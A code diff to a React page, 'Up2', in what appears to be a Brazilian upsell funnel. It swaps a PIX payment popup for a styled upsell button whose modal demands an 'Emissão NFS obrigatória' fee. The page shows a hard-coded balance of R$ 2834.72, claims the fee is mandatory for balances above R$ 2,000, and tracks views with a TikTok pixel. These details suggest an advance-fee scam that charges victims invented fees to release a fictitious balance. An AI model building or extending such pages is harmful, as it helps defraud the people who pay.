@@ -1,9 +1,6 @@
-import { useState, useEffect } from 'react';
-import { useNavigate } from 'react-router-dom';
-import ParadisePixPopup from '@/components/ParadisePixPopup';
+import { useEffect } from 'react';
 import PageTransition from '@/components/PageTransition';
 import { trackViewContent } from '@/lib/tiktokPixel';
-import { useCustomerData } from '@/hooks/useCustomerData';
 import '../styles/app.css';
 
 const SALDO_FINAL = 2834.72;
@@ -19,18 +16,9 @@ const formatBR = (value: number) => {
 };
 
 const Up2 = () => {
-  const navigate = useNavigate();
-  const [showPixPopup, setShowPixPopup] = useState(false);
-  const { customer } = useCustomerData();
-
   useEffect(() => {
     trackViewContent('Emissão NFS', TAXA_NFS);
   }, []);
-
-  const handlePaymentSuccess = () => {
-    setShowPixPopup(false);
-    navigate('/up3');
-  };
 
   return (
     <PageTransition>
@@ -81,8 +69,26 @@ const Up2 = () => {
           </div>
 
           <button
-            onClick={() => setShowPixPopup(true)}
-            className="cta-button cta-primary"
+            className="paradise-upsell-btn"
+            style={{
+              backgroundColor: '#fe2b54',
+              color: '#ffffff',
+              padding: '12px 20px',
+              border: 'none',
+              borderRadius: '6px',
+              fontSize: '16px',
+              fontWeight: 'bold',
+              cursor: 'pointer',
+              width: '100%',
+              marginTop: '1rem',
+            }}
+            data-offer-hash="upsell_a45894a88ec0a1ff"
+            data-modal-title="Emitir NFS Obrigatória"
+            data-copy-button-text="Copiar Código PIX"
+            data-modal-bg="#ffffff"
+            data-modal-title-color="#1f2937"
+            data-modal-btn-color="#28a745"
+            data-modal-btn-text-color="#ffffff"
           >
             Emitir NFS obrigatória
           </button>
@@ -91,17 +97,6 @@ const Up2 = () => {
             A emissão é obrigatória para saldos acima de R$ 2.000
           </p>
         </div>
-
-        {showPixPopup && (
-          <ParadisePixPopup
-            amount={TAXA_NFS_CENTAVOS}
-            description="Emissão NFS obrigatória"
-            productHash={PRODUCT_HASH}
-            customer={customer}
-            onSuccess={handlePaymentSuccess}
-            onClose={() => setShowPixPopup(false)}
-          />
-        )}
       </main>
     </PageTransition>
   );
